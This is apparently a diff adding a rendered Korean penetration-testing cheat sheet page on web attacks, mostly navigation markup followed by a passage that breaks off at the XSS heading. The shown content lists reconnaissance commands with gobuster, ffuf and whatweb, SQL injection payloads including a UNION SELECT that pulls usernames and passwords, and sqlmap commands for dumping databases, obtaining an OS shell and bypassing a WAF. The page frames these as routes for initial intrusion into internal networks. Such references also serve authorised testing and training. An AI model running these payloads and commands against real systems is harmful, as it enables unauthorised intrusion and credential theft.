+  <a href="#http-request-smuggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Request Smuggling
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#race-condition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Race Condition
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#graphql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GraphQL 공격
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OAuth 공격
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        유용한 도구
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud 공격
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../evasion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    방어 우회
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    오퍼레이션 인프라
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    오퍼레이션 인프라
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    개요
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra/shells/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    리버스 쉘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra/file-transfer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    파일 전송
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra/pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    피봇 / 터널링
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra/c2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C2 프레임워크
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    도구 레퍼런스
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="목차">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      목차
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        정보 수집
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="정보 수집">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        기술 스택 확인
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        디렉토리 / 파일 열거
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        서브도메인 열거
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        파라미터 Fuzzing
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SQL Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        수동 테스트
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sqlmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-cross-site-scripting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XSS (Cross-Site Scripting)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS (Cross-Site Scripting)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reflected XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Stored XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DOM-based XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        필터 우회
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-server-side-request-forgery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF (Server-Side Request Forgery)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Upload
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-rfi-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI / RFI (File Inclusion)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="LFI / RFI (File Inclusion)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lfi-local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI (Local File Inclusion)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#log-poisoning-lfi-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Log Poisoning (LFI → RCE)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rfi-remote-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RFI (Remote File Inclusion)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command Injection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-server-side-template-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSTI (Server-Side Template Injection)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSTI (Server-Side Template Injection)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        탐지
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        익스플로잇
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JWT 공격
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#deserialization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Deserialization
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Deserialization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PHP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Java
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python-pickle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Python (Pickle)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-xml-external-entity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE (XML External Entity)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XXE (XML External Entity)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        기본 XXE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-xxe-out-of-band" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind XXE (Out-of-Band)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-via-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via File Upload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE → SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csrf-cross-site-request-forgery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CSRF (Cross-Site Request Forgery)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cors-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CORS Misconfiguration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#idor-access-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IDOR / Access Control
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-request-smuggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Request Smuggling
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#race-condition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Race Condition
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#graphql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GraphQL 공격
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OAuth 공격
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        유용한 도구
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="web">Web 공격</h1>
+<p>웹 애플리케이션을 대상으로 한 공격 기법. 외부 침투 시 주요 공격 벡터로, 내부망 접근을 위한 초기 침투 경로가 될 수 있다.</p>
+<hr />
+<h2 id="_1">정보 수집</h2>
+<h3 id="_2">기술 스택 확인</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Wappalyzer 대안 - whatweb</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>whatweb<span class="w"> </span>&lt;url&gt;
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># HTTP 헤더 확인</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>curl<span class="w"> </span>-I<span class="w"> </span>&lt;url&gt;
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>curl<span class="w"> </span>-v<span class="w"> </span>&lt;url&gt;<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;server\|x-powered\|x-aspnet&#39;</span>
+</code></pre></div>
+<h3 id="_3">디렉토리 / 파일 열거</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># gobuster</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>&lt;url&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span>-t<span class="w"> </span><span class="m">50</span><span class="w"> </span>-x<span class="w"> </span>php,asp,aspx,jsp,html,txt,bak
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># feroxbuster (재귀 탐색)</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>feroxbuster<span class="w"> </span>-u<span class="w"> </span>&lt;url&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">  </span>-t<span class="w"> </span><span class="m">50</span><span class="w"> </span>-x<span class="w"> </span>php,asp,aspx
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1"># ffuf</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>&lt;url&gt;/FUZZ<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">  </span>-t<span class="w"> </span><span class="m">50</span><span class="w"> </span>-mc<span class="w"> </span><span class="m">200</span>,301,302,403
+</code></pre></div>
+<h3 id="_4">서브도메인 열거</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># ffuf vhost</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>&lt;url&gt;<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ.&lt;domain&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">  </span>-fs<span class="w"> </span>&lt;default_size&gt;
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c1"># gobuster vhost</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>gobuster<span class="w"> </span>vhost<span class="w"> </span>-u<span class="w"> </span>&lt;url&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">  </span>--append-domain
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="c1"># DNS 기반</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>gobuster<span class="w"> </span>dns<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+</code></pre></div>
+<h3 id="fuzzing">파라미터 Fuzzing</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># GET 파라미터</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>ffuf<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?FUZZ=test&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span>-fs<span class="w"> </span>&lt;default_size&gt;
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="c1"># POST 파라미터</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>ffuf<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;&#39;</span><span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;FUZZ=test&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">  </span>-fs<span class="w"> </span>&lt;default_size&gt;
+</code></pre></div>
+<hr />
+<h2 id="sql-injection">SQL Injection</h2>
+<h3 id="_5">수동 테스트</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="o">#</span><span class="w"> </span><span class="err">기본</span><span class="w"> </span><span class="err">테스트</span><span class="w"> </span><span class="err">페이로드</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="s1">&#39; OR 1=1--</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="s1">&quot; OR 1=1--</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="s1">&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="s1"># UNION 기반 - 컬럼 수 확인</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">1</span><span class="c1">-- -</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="s1">&#39; ORDER BY 2-- -</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">-- -</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="o">#</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="err">기반</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">데이터</span><span class="w"> </span><span class="err">추출</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="s1">&#39; UNION SELECT 1,username,password FROM users-- -</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="s1"># Error 기반 (MSSQL)</span>
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">int</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">TOP</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">))</span><span class="c1">-- -</span>
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="o">#</span><span class="w"> </span><span class="k">Time</span><span class="w"> </span><span class="err">기반</span><span class="w"> </span><span class="n">Blind</span>
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="s1">&#39; AND IF(1=1,SLEEP(5),0)-- -          # MySQL</span>
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="s1">&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="c1">-- -          # MSSQL</span>
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="c1">-- -                 # PostgreSQL</span>
+</code></pre></div>
+<h3 id="sqlmap">sqlmap</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># 기본 사용</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?id=1&#39;</span><span class="w"> </span>--batch
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># POST 요청</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;&#39;</span><span class="w"> </span>--data<span class="o">=</span><span class="s1">&#39;user=admin&amp;pass=test&#39;</span><span class="w"> </span>--batch
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># 쿠키/헤더 포함</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?id=1&#39;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s1">&#39;session=abc123&#39;</span><span class="w"> </span>--batch
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c1"># 데이터 덤프</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?id=1&#39;</span><span class="w"> </span>--dbs<span class="w">                    </span><span class="c1"># 데이터베이스 목록</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?id=1&#39;</span><span class="w"> </span>-D<span class="w"> </span>&lt;db&gt;<span class="w"> </span>--tables<span class="w">         </span><span class="c1"># 테이블 목록</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?id=1&#39;</span><span class="w"> </span>-D<span class="w"> </span>&lt;db&gt;<span class="w"> </span>-T<span class="w"> </span>&lt;tbl&gt;<span class="w"> </span>--dump<span class="w">  </span><span class="c1"># 데이터 덤프</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="c1"># OS Shell (DBA 권한 시)</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?id=1&#39;</span><span class="w"> </span>--os-shell
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?id=1&#39;</span><span class="w"> </span>--os-cmd<span class="o">=</span><span class="s1">&#39;whoami&#39;</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="c1"># WAF 우회</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;url&gt;?id=1&#39;</span><span class="w"> </span>--tamper<span class="o">=</span>space2comment,between<span class="w"> </span>--random-agent
+</code></pre></div>
+<hr />
+<h2 id="xss-cross-site-scripting">XSS (Cross-Site Scripting)</h2>
+<h3 id="reflected-xss">Reflected XSS</h3>
